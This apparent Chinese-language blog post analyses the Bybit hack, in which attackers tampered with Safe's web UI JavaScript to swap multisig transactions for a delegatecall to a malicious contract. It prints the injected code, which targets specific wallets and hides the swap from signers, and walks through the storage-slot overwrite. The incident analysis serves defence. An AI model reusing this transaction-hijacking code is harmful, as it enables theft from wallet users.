---
title: "Bybit 被盗事件分析"
date: 2025-04-08T11:25:05
featured_image: "/images/cap20250408235444.png"
tags: ["web3安全事件","合约审计","delegatecall"]
description: "Bybit 遭遇一起精密的黑客攻击，涉及其使用的 Safe 多签合约，被盗窃近15亿"
---


### 案件元数据

```
被盗合约：0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4
初始黑客地址：0x47666fab8bd0ac7003bce3f5c3585383f09486e2
黑客部署的恶意合约1：0x96221423681a6d52e184d440a8efcebb105c7242
黑客部署的恶意合约2：0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
修改逻辑合约交易：0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882
盗窃交易1：0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9
盗窃交易2：0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c
盗窃交易3：0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20
盗窃交易4：0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0
盗窃交易5：0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647

Safe 事后审计报告：https://archive.ph/OxemM
官方报告（已失效）：https://docsend.com/view/s/rmdi832mpt8u93s7
OneKey 评价：https://x.com/OneKeyCN/status/1894783804512051469
23pd 评价：https://x.com/im23pds/status/1894637152392434013
ScamSniffer 分析：https://x.com/realScamSniffer/status/1894910207052128263
黑客测试交易：https://etherscan.io/tx/0xbe42ca77d43686c822a198c3641f3dadd1edcb5fde22fbc1738b3298a9c25ddb
Verichains 报告：https://github.com/verichains/public-audit-reports/blob/main/Bybit%20Incident%20Investigation%20-%20Preliminary%20Report%20v1.0%20(for%20public%20release).pdf
Safe 官网存档：https://web.archive.org/web/20250000000000*/safe.global
ChromeCacheView 下载地址：https://www.nirsoft.net/utils/chrome_cache_view.html
```

事件涉及一笔修改合约交易和五笔盗窃交易：



<center>{{< figure src="/images/cap20250408235125.png" width="100%"  >}}</center>


Safe 合约被篡改的 JS 恶意文件如下：

```
恶意存档：
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js

正常存档：
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
注：6514.b556851795a4cbaa.js 文件暂未找到，暂跳过分析。
```

---

## 具体分析

### JS 代码分析

以下是被篡改的核心 JS 代码片段：

```javascript
let sd = c; // Safe SDK 实例
let se = e; // 交易对象
let st = t; // 交易选项
let wa = ["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4", "0x19c6876e978d9f128147439ac4cd9ea2582cd141"]; // 目标 Safe 地址
let ba = ["0x828424517f9f04015db02169f4026d57b2b07229", "0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"]; // 目标签名者地址
let ta = "0x96221423681a6d52e184d440a8efcebb105c7242"; // 黑客恶意合约地址
let da = "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000"; // 恶意数据
let op = 1; // 操作类型（delegatecall）
let vl = 0; // 交易价值
let sga = 45746; // Safe 交易 gas 限制
let sf = sd.getSafeProvider();
let sa = await sf.getSignerAddress();
sa = sa.toLowerCase();
let lu = await sd.getAddress();
lu = lu.toLowerCase();
const cf = wa.some(k1 => lu.includes(k1)); // 检查是否为目标 Safe 地址
const cb = ba.some(k1 => sa.includes(k1)); // 检查是否为目标签名者地址
if (cf == true && se.data.operation == 0) {
    const td = structuredClone(se.data); // 保存原始交易数据副本
    se.data.to = ta; // 修改目标地址为黑客合约
    se.data.operation = op; // 修改为 delegatecall
    se.data.data = da; // 设置恶意数据
    se.data.value = vl;
    se.data.safeTxGas = sga;
    try {
        l = await sd.executeTransaction(se, st); // 执行篡改后的交易
        se.data = td; // 恢复原始数据
    } catch (e) {
        se.data = td;
        throw e;
    }
} else {
    l = await sd.executeTransaction(se, st); // 执行原始交易
}
```

Verichains 提供了更清晰的注释版代码，逻辑如下：

```javascript
let targetSafeAddresses = ["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4", "0x19c6876e978d9f128147439ac4cd9ea2582cd141"]; // 攻击目标 Safe 地址
let targetSignerAddresses = ["0x828424517f9f04015db02169f4026d57b2b07229", "0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"]; // 目标签名者地址
let attackerAddress = "0x96221423681a6d52e184d440a8efcebb105c7242"; // 黑客接收地址
let attackPayload = "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000"; // 恶意数据
let attackOperation = 1; // delegatecall 操作
let attackValue = 0; // 无 Ether 转移
let attackSafeTxGas = 45746; // 交易 gas 限制

let safeSDK = c;
let safeProvider = safeSDK.getSafeProvider();
let signerAddress = await safeProvider.getSignerAddress().then(addr => addr.toLowerCase());
let safeAddress = await safeSDK.getAddress().then(addr => addr.toLowerCase());
const isTargetedSafe = targetSafeAddresses.some(addr => safeAddress.includes(addr));
const isTargetedSigner = targetSignerAddresses.some(addr => signerAddress.includes(addr));

if (isTargetedSafe && safeTransaction.data.operation === 0) {
    const originalTransactionData = structuredClone(safeTransaction.data);
    safeTransaction.data.to = attackerAddress;
    safeTransaction.data.operation = attackOperation;
    safeTransaction.data.data = attackPayload;
    safeTransaction.data.value = attackValue;
    safeTransaction.data.safeTxGas = attackSafeTxGas;
    try {
        l = await safeSDK.executeTransaction(safeTransaction, txOptions);
        safeTransaction.data = originalTransactionData;
    } catch (error) {
        safeTransaction.data = originalTransactionData;
        throw error;
    }
} else {
    l = await safeSDK.executeTransaction(safeTransaction, txOptions);
}
```

这段代码的逻辑非常清晰：黑客通过篡改 Safe Web UI 的 JS，拦截特定 Safe 地址的交易（`targetSafeAddresses`），将其替换为通过 `DELEGATECALL` 调用恶意合约的操作。篡改后的交易在受害者合约环境中执行，核心是通过 `delegatecall` 将控制权交给黑客部署的恶意合约。

攻击流程示意图如下：

<center>{{< figure src="/images/cap20250408235220.png" width="100%"  >}}</center>
<center>{{< figure src="/images/cap20250408235228.png" width="100%"  >}}</center>

（其实后续通过研究js发现，没有限制签名者地址，只是限制了受害合约地址）

---

### 攻击交易分析

核心交易：
[https://app.blocksec.com/explorer/tx/eth/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882](https://app.blocksec.com/explorer/tx/eth/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882)

交易截图：

<center>{{< figure src="/images/cap20250408235139.png" width="100%"  >}}</center>

链下与链上攻击时序图（来源于 NCC Group 分析报告：[https://www.nccgroup.com/sg/research-blog/in-depth-technical-analysis-of-the-bybit-hack/](https://www.nccgroup.com/sg/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)）：
<center>{{< figure src="/images/cap20250408235146.png" width="100%"  >}}</center>
<center>{{< figure src="/images/cap20250408235154.png" width="100%"  >}}</center>


---

## 攻击详细步骤

1. **前期准备**：黑客提前入侵 Safe 的 AWS 存储桶，并且获取了 Bybit 的例行转账模式和相关信息。
2. **篡改前端**：黑客修改了 Safe Web UI 的 JS 代码，通过逻辑拦截筛选特定交易，并将其替换为恶意内容。
3. **伪装交易**：为了避免 Bybit 员工察觉，黑客保存了原始交易数据的副本，在前端页面展示正常内容，诱导员工相信交易未被篡改。（显然，员工过于信任 Safe 的界面，未仔细核对钱包显示的实际内容。）
4. **签名触发**：一旦其他 Bybit 员工完成签名，篡改后的交易即被执行。
5. **篡改细节**：
   - 操作类型（`operation`）从 0 修改为 1（`delegatecall`）。
   - 目标地址（`to`）改为黑客恶意合约：`0x96221423681a6d52e184d440a8efcebb105c7242`。
   - 数据（`data`）设置为：`0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000`，即调用 `transfer` 函数，参数为地址 `0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516` 和数量 0。
   - **执行流程**：
     - Bybit 员工通过 Safe Web UI 发起交易，调用 Safe 代理合约。
     - 代理合约通过 `delegatecall` 调用 Safe 逻辑合约（`masterCopy`）验证签名。
     - 签名验证通过后，逻辑合约根据 `operation = 1` 再次通过 `delegatecall` 调用恶意合约 `0x96221423681a6d52e184d440a8efcebb105c7242`，传入篡改后的 `data`。
     - 由于全程使用 `delegatecall`，执行上下文始终是代理合约，最终 `slot 0`（存储 `masterCopy` 地址的槽）被修改为 `0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516`。
     - 调用链等价于：`Proxy -> delegatecall masterCopy -> delegatecall 0x96221423681a6d52e184d440a8efcebb105c7242`。
   - **后续提币**：黑客通过直接调用 Safe 代理合约，触发恶意合约 `0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516` 执行提币操作。

---

## 总结

这次攻击暴露了多层安全漏洞，堪称“瑞士奶酪模型”的典型案例：

1. **前端防护不足**：若 JS 无法篡改前端显示内容，Bybit 员工不会被误导。
2. **签名核查缺失**：若三位员工仔细检查签名内容，可能拒绝签名。
3. **合约设计缺陷**：Safe 逻辑合约未限制 `delegatecall` 的使用，导致 `slot 0` 被恶意修改。若仅开放特定功能，可避免此类攻击。
4. **交易校验缺失**：若存在内部服务根据预定义策略检查交易，篡改行为可能被拦截。

<center>{{< figure src="/images/cap20250408235444.png" width="100%"  >}}</center>
这些“奶酪洞”叠加，最终为黑客铺就了一条直捣黄龙的道路。Safe Web UI 的 JS 篡改只是切入点，而 Safe 逻辑合约对 `delegatecall` 的过度开放，以及缺乏交易语义校验（仅验证签名），才是灾难性后果的根源。



